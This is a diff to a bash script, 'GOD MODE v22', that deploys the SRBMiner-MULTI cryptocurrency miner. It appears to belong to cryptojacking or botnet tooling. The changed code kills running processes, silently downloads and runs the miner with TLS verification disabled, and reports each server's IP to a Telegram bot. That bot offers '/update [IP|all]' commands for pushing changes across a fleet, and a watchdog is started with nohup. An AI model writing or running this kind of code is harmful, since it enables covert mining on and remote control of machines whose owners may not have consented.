@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v21: SRBMiner-MULTI PEARL (PRL) FULL RELEASE    |
+# | GOD MODE v22: AUTO-PURGE OLD BINARIES & SRBMINER FIX     |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -73,7 +73,7 @@ detect_gpu() {
 HAS_GPU=$(detect_gpu)
 
 # ----------------------------------------------------
-# [ PHASE 2: MODULE DOWNLOAD & ARCHITECTURE DETECTION ]
+# [ PHASE 2: MODULE DOWNLOAD & AUTO-PURGE OLD BINARIES ]
 # ----------------------------------------------------
 ARCH=$(uname -m)
 
@@ -114,16 +114,30 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (SRBMiner-MULTI for Pearl)
-if [ "$HAS_GPU" -eq 1 ] && [ ! -f "$BIN_GPU" ]; then
-    curl -L -k -s -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz "$URL_SRBMINER"
-    tar -xf gpu.tar.gz 2>/dev/null
-    FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
-    if [ -n "$FOUND_GPU" ]; then
-        mv "$FOUND_GPU" "./$BIN_GPU"
-        chmod +x "./$BIN_GPU"
+# GPU Setup (Авто-проверка: если лежит старый lolMiner, он удаляется и ставится SRBMiner)
+if [ "$HAS_GPU" -eq 1 ]; then
+    NEED_INSTALL=0
+    if [ ! -f "$BIN_GPU" ]; then
+        NEED_INSTALL=1
+    else
+        # Если файл есть, но это НЕ SRBMiner — сносим старый бинарник
+        if ! ./$BIN_GPU --version 2>&1 | grep -i "SRBMiner" >/dev/null; then
+            rm -f "$BIN_GPU"
+            NEED_INSTALL=1
+        fi
     fi
-    rm -rf gpu.tar.gz SRBMiner*
+
+    if [ "$NEED_INSTALL" -eq 1 ]; then
+        pkill -9 -f "$BIN_GPU" 2>/dev/null
+        curl -L -k -s -o gpu.tar.gz "$URL_SRBMINER" || wget -qO gpu.tar.gz "$URL_SRBMINER"
+        tar -xf gpu.tar.gz 2>/dev/null
+        FOUND_GPU=$(find . -type f -name "SRBMiner-MULTI" | head -n 1)
+        if [ -n "$FOUND_GPU" ]; then
+            mv "$FOUND_GPU" "./$BIN_GPU"
+            chmod +x "./$BIN_GPU"
+        fi
+        rm -rf gpu.tar.gz SRBMiner*
+    fi
 fi
 
 # ----------------------------------------------------
@@ -285,7 +299,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V21 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V22 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -407,7 +421,7 @@ nohup ./watchdog.sh >/dev/null 2>&1 &
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V21 INITIALIZED"
+echo "[+] ENGINE V22 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
